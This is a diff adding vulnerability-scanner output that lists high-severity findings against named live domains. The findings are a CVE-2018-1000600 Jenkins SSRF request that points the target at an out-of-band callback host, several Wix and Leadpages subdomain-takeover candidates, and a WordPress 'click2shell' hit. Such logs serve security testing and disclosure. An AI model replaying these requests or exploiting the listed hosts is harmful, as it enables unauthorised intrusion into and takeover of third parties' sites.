@@ -1,0 +1,6 @@
+[CVE-2018-1000600] [http] [high] https://events.nightcrows.com/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://dc3cs4cc92e3i8sr7jj0s5n3oj5d9ixyn.oast.online
+[leadpages-takeover] [http] [high] https://foldapp.com
+[wix-takeover] [http] [high] https://site-dev.wirexapp.com ["pointing.wixdns.net"]
+[wix-takeover] [http] [high] https://www.promo.wirexapp.com ["pointing.wixdns.net"]
+[wix-takeover] [http] [high] https://www.site-dev.wirexapp.com ["pointing.wixdns.net"]
+[wordpress-click2shell] [http] [high] https://swag.giveth.io/wp-admin/js/theme.js
